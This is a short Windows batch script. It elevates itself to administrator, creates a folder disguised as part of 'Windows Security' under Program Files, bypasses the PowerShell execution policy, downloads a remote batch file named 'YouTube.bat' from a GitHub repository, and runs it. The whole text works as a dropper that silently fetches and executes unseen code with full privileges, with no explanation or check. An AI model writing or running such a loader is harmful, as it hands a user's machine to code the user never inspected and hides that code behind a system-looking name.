echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
MD "%ProgramFiles%\Windows Security\Soldatik90"
cd "%ProgramFiles%\Windows Security\Soldatik90"
powershell -executionpolicy bypass -command Invoke-WebRequest "https://raw.githubusercontent.com/Soldatik90x/Soldatik90/refs/heads/main/YouTube.bat" -o "YouTube.BAT"
CALL "%ProgramFiles%\Windows Security\Soldatik90\YouTube.BAT"
